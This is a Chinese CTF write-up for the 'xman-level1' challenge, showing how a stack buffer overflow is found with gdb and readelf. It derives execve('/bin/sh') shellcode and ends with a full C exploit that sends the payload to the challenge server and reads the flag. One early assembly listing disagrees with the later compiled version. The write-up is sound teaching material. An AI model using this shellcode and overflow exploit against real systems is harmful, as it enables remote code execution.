## xman-level1

2019-5-14

### 分析

首先查看下文件类型

```shell
$ file level1.80eacdcd51aca92af7749d96efad7fb5
level1.80eacdcd51aca92af7749d96efad7fb5: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-, for GNU/Linux 2.6.32, BuildID[sha1]=7d479bd8046d018bbb3829ab97f6196c0238b344, not stripped
```

32bit的程序。

使用python第三方模块pwntools带的checksec命令查看保护措施，没有开栈保护措施

```shell
$ checksec level1.80eacdcd51aca92af7749d96efad7fb5
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x8048000)
    RWX:      Has RWX segments
```



由于只知道比赛给了gdb，所以接下来只拿gdb和其他的工具（安装gdb时同时会安装的工具）进行分析

**首先查看栈是否可写**

```shell
$ readelf -e level1.80eacdcd51aca92af7749d96efad7fb5 | grep GNU_STACK
  GNU_STACK      0x000000 0x00000000 0x00000000 0x00000 0x00000 RWE 0x10

```

栈是可执行的，RW**E**（Read Write Execute)

**再看看程序有什么函数**（如果符号表被删掉了就不能看，不过这里是`not stripped`，没有删符号表）

```shell
$ readelf -s level1.80eacdcd51aca92af7749d96efad7fb5 | grep FUNC
     1: 00000000     0 FUNC    GLOBAL DEFAULT  UND read@GLIBC_2.0 (2)
     2: 00000000     0 FUNC    GLOBAL DEFAULT  UND printf@GLIBC_2.0 (2)
     4: 00000000     0 FUNC    GLOBAL DEFAULT  UND __libc_start_main@GLIBC_2.0 (2)
     5: 00000000     0 FUNC    GLOBAL DEFAULT  UND write@GLIBC_2.0 (2)
    29: 080483c0     0 FUNC    LOCAL  DEFAULT   13 deregister_tm_clones
    30: 080483f0     0 FUNC    LOCAL  DEFAULT   13 register_tm_clones
    31: 08048430     0 FUNC    LOCAL  DEFAULT   13 __do_global_dtors_aux
    34: 08048450     0 FUNC    LOCAL  DEFAULT   13 frame_dummy
    45: 08048550     2 FUNC    GLOBAL DEFAULT   13 __libc_csu_fini
    46: 00000000     0 FUNC    GLOBAL DEFAULT  UND read@@GLIBC_2.0
    48: 080483b0     4 FUNC    GLOBAL HIDDEN    13 __x86.get_pc_thunk.bx
    50: 00000000     0 FUNC    GLOBAL DEFAULT  UND printf@@GLIBC_2.0
    52: 08048554     0 FUNC    GLOBAL DEFAULT   14 _fini
    53: 0804847b    60 FUNC    GLOBAL DEFAULT   13 vulnerable_function
    58: 00000000     0 FUNC    GLOBAL DEFAULT  UND __libc_start_main@@GLIBC_
    59: 00000000     0 FUNC    GLOBAL DEFAULT  UND write@@GLIBC_2.0
    60: 080484f0    93 FUNC    GLOBAL DEFAULT   13 __libc_csu_init
    62: 08048380     0 FUNC    GLOBAL DEFAULT   13 _start
    65: 080484b7    55 FUNC    GLOBAL DEFAULT   13 main
    69: 080482f4     0 FUNC    GLOBAL DEFAULT   11 _init

```

有一个vulnerable_function

先看一下main函数的汇编代码

```assembly
(gdb) set disassembly-flavor intel     //设置汇编语句样式，默认为AT&T
(gdb) disass main
Dump of assembler code for function main:
   0x080484b7 <+0>:		lea    ecx,[esp+0x4]
   0x080484bb <+4>:		and    esp,0xfffffff0
   0x080484be <+7>:		push   DWORD PTR [ecx-0x4]
   0x080484c1 <+10>:	push   ebp
   0x080484c2 <+11>:	mov    ebp,esp
   0x080484c4 <+13>:	push   ecx
=> 0x080484c5 <+14>:	sub    esp,0x4
   0x080484c8 <+17>:	call   0x804847b <vulnerable_function>
   0x080484cd <+22>:	sub    esp,0x4
   0x080484d0 <+25>:	push   0xe
   0x080484d2 <+27>:	push   0x8048581
   0x080484d7 <+32>:	push   0x1
   0x080484d9 <+34>:	call   0x8048370 <write@plt>
   0x080484de <+39>:	add    esp,0x10
   0x080484e1 <+42>:	mov    eax,0x0
   0x080484e6 <+47>:	mov    ecx,DWORD PTR [ebp-0x4]
   0x080484e9 <+50>:	leave  
   0x080484ea <+51>:	lea    esp,[ecx-0x4]
   0x080484ed <+54>:	ret    
End of assembler dump.
(gdb) x/s 0x8048581
0x8048581:	"Hello, World!\n"
```

调用了vulnerable_function函数，又调用了write函数，打印字符串`"Hello, World!\n"`

看一下vulnerable_function函数

```assembly
(gdb) disass vulnerable_function 
Dump of assembler code for function vulnerable_function:
   0x0804847b <+0>:		push   ebp
   0x0804847c <+1>:		mov    ebp,esp
   0x0804847e <+3>:		sub    esp,0x88
   0x08048484 <+9>:		sub    esp,0x8
   0x08048487 <+12>:	lea    eax,[ebp-0x88]
   0x0804848d <+18>:	push   eax
   0x0804848e <+19>:	push   0x8048570
   0x08048493 <+24>:	call   0x8048340 <printf@plt>
   0x08048498 <+29>:	add    esp,0x10
   0x0804849b <+32>:	sub    esp,0x4
   0x0804849e <+35>:	push   0x100
   0x080484a3 <+40>:	lea    eax,[ebp-0x88]
   0x080484a9 <+46>:	push   eax
   0x080484aa <+47>:	push   0x0
   0x080484ac <+49>:	call   0x8048330 <read@plt>
   0x080484b1 <+54>:	add    esp,0x10
   0x080484b4 <+57>:	nop
   0x080484b5 <+58>:	leave  
   0x080484b6 <+59>:	ret    
End of assembler dump.
(gdb) x/s 0x8048570
0x8048570:	"What's this:%p?\n"
```

先调用了printf函数，格式化字符串为`"What's this:%p?\n"`，`%p`为ebp-0x88。打印出了局部变量的内存地址。

可以看到0x080484ac处call了read函数，指定buf为栈上ebp-0x88的位置，最多写入0x100个字节。这里显然是一个溢出点，因为存储数据的buf空间只有0x88个字节。

接下来便是利用这个函数，来getshell

### shellcode编写

这里打算通过系统调用(int 0x80)，调用execve函数，执行文件为/bin/sh

先说一下如何触发系统调用



首先需要在eax里指定要调用函数的**系统调用号**

然后放置调用该函数时传递的参数[(1)](#引用)

> 在x86系统上，`ebx`, `ecx`, `edx`, `esi`和`edi`按照顺序存放前五个参数。

然后执行`int 0x80`汇编指令，触发系统调用



接下来说一下如何调用execve函数

首先是调用号，一般可以在系统的`/usr/include/x86_64-linux-gnu/asm/`目录下，有一个unistd*.h文件

我这里的文件是unistd_32.h

查找execve的调用号，此处为**11**

```c
#define __NR_link 9
#define __NR_unlink 10
#define __NR_execve 11
#define __NR_chdir 12
#define __NR_time 13
```

一般来讲这个调用号在不同的发行版是一样的



然后是参数

exevce的参数可以用`man execve`来查看

>int execve(const char *filename, char *const argv[],
>                  char *const envp[]);

> execve()  executes  the program pointed to by filename.
>
> argv is an array of argument strings passed to the new program.
>
> envp is an array of strings, conventionally of the form key=value, which are passed as environment to the new program.

为了达到getshell目的，调用函数的代码为`execve("/bin/sh", 指向空指针, 指向空指针);`

汇编代码是

```
xor eax, eax
push eax        //表示字符串结束的\x00
push 0x68732f6e //存储字符串  倒序的n/sh
push 0x69622f2f //存储字符串  倒序的//bi
mov ebx, esp    //把字符串的指针存储到ebx，即第一个参数
push eax
mov ecx, esp    //将ecx指向空指针，即第二个参数
xor edx, esp    //将ecx指向空指针，即第三个参数
mov al, 11     //放置系统调用号, 如果mov到eax则会多移动几个\x00，会产生截断，所以mov到al中
int 0x80
```

关于字符串为什么是那一串倒着的十六进制ASCII码，

首先32位系统一次只能向栈上push 4个字节的数据，所以是一次push四个字符。

又因为这个程序在开头的checksec中发现是`i386-32-little`，即**小端序**，所以计算机读取数据从高地址处开始读，所以需要把字符串数据倒着的形式压入栈中。（readelf -h 同样可以查看字节序）

另外你会发现我在前面多加了一个斜线`/`，是因为要保证一次有四个字节。如果不是四个字节的话编译器会自动补充\x00，从而导致机器码中有\x00。在read函数读取数据时，遇到\x00会停止继续读取。

同时在linux里，路径最前面无论有多少个斜线，最终只会当成一个斜线。

所以//bin/sh还是等效于/bin/sh

```python
>>> for i in '//bin/sh'[::-1]:
...     print("%x"%ord(i), end="")
... 
68732f6e69622f2f>>>
```



接下来是获取shellcode

```c
//shellcode.c
int main()
{
    __asm__("xor eax, eax\n\t"
            "push eax\n\t"
            "push 0x68732f6e\n\t"
            "push 0x69622f2f\n\t"
            "mov ebx, esp\n\t"
            "push eax\n\t"
            "mov ecx, esp\n\t"
            "mov edx, esp\n\t"
            "mov al, 11\n\t"
            "int 0x80"
           );
    return 0;
}
```

gcc编译（这里用kali里带的gcc进行编译，ubuntu16 18会提示缺32位的东西）

```shell
$ gcc -m32 -masm=intel shellcode.c
```

-m32指定编译32位程序，-masm=intel指定内联汇编格式为intel风格

运行一下编译出来的程序，运行正常，达到预期目的

```shell
root@kali:~# ./a.out 
# whoami
root
# exit
```

然后通过`objdump -d -mi386:intel a.out`命令拿到main函数中内联汇编代码对应的机器码

其中`-mi386:intel`指定汇编风格

```asm
00001189 <main>:
    1189:	55                   	push   ebp
    118a:	89 e5                	mov    ebp,esp
    118c:	e8 24 00 00 00       	call   11b5 <__x86.get_pc_thunk.ax>
    1191:	05 6f 2e 00 00       	add    eax,0x2e6f
    1196:	31 c0                	xor    eax,eax          //内联汇编开始
    1198:	50                   	push   eax
    1199:	68 6e 2f 73 68       	push   0x68732f6e
    119e:	68 2f 2f 62 69       	push   0x69622f2f
    11a3:	89 e3                	mov    ebx,esp
    11a5:	50                   	push   eax
    11a6:	89 e1                	mov    ecx,esp
    11a8:	89 e2                	mov    edx,esp
    11aa:	b0 0b                	mov    al,0xb
    11ac:	cd 80                	int    0x80           //内联汇编结束
    11ae:	b8 00 00 00 00       	mov    eax,0x0
    11b3:	5d                   	pop    ebp
    11b4:	c3                   	ret    

```



至此，shellcode即为

```c
int main()
{
    char shellcode[] =  "\x31\xc0"              /*xor    eax,eax*/
                        "\x50"                  /*push   eax*/
                        "\x68\x6e\x2f\x73\x68"  /*push   0x68732f6e*/
                        "\x68\x2f\x2f\x62\x69"  /*push   0x69622f2f*/
                        "\x89\xe3"              /*mov    ebx,esp*/
                        "\x50"                  /*push   eax*/
                        "\x89\xe1"              /*mov    ecx,esp*/
                        "\x89\xe2"              /*mov    edx,esp*/
                        "\xb0\x0b"              /*mov    al,0xb*/
                        "\xcd\x80";             /*int    0x80*/
    return 0;
}
```



### 编写攻击程序

直接上程序了

```c
//exp.c
#include <stdlib.h>
#include <string.h>
#include <stdio.h>

#include <sys/socket.h>
#include <arpa/inet.h>
#include <netinet/in.h>
#include <unistd.h>

char shellcode[] =  "\x31\xc0"
					"\x50"
					"\x68\x6e\x2f\x73\x68"
					"\x68\x2f\x2f\x62\x69"
					"\x89\xe3"
					"\x50"
					"\x89\xe1"
					"\x89\xe2"
					"\xb0\x0b"
					"\xcd\x80";

char *address = "45.248.85.153";//pwn2.jarvisoj.com
short port = 9877;

int SendPayload(char* payload, int length)
{
	int socketfd = socket(AF_INET, SOCK_STREAM, 0);
	struct sockaddr_in serverAddr;
	memset(&serverAddr, 0, sizeof(struct sockaddr_in));

	serverAddr.sin_family = AF_INET;
	serverAddr.sin_port = htons(port);
	inet_pton(AF_INET, address, &serverAddr.sin_addr);

	int ret = connect(socketfd, (struct sockaddr*)&serverAddr, sizeof(struct sockaddr_in));

	printf("ret code: %d\n",ret);
	char *buffer = (char*)malloc(1024);
	recv(socketfd, buffer, 1023, 0);

	const char *str = strstr(buffer, "0x");
	
	char *pstack = (char*)malloc(9);
	strncpy(pstack, str+2, 8);

	long ptr = strtol(str+2, 0, 16);
	
	memcpy((char*)(payload+length-5), &ptr, 4);

	send(socketfd, payload, length, 0);
	

	const char *command = "cat flag*\n";
	send(socketfd, command, strlen(command)+1, 0);

	recv(socketfd, buffer, 1023, 0);
	printf(buffer);
	fflush(stdout);

	free(buffer);

	close(socketfd);
	
	return 0;

}


int main()
{
	int paddingLength = 0x88+0x4 - strlen(shellcode);
	char *padding = (char*)malloc(paddingLength+1);
	memset(padding, 'A', paddingLength);
	padding[paddingLength] = '\0';

	
	int payloadLength = strlen(shellcode) + paddingLength + 4 + 1;
	char *payload = (char*)malloc(payloadLength);
	strcpy(payload, shellcode);
	strcat(payload, padding);

	printf("sendding payload...\n");	
	SendPayload(payload, payloadLength);

	free(padding);
	free(payload);
	return 0;
}


```

编译运行

```shell
$ gcc -o fuck exp.c
$ ./fuck 
sendding payload...
ret code: 0
CTF{xxxxxxxxxxxxxxxxxxxxxxxxxxx}
```

过后更新带交互shell的版本

### 引用

1. Linux系统调用详解 https://blog.csdn.net/gatieme/article/details/50779184
2. gcc使用intel格式内联汇编 https://stackoverflow.com/questions/199966/how-do-you-use-gcc-to-generate-assembly-code-in-intel-syntax
3. 理解字节序 http://www.ruanyifeng.com/blog/2016/11/byte-order.html

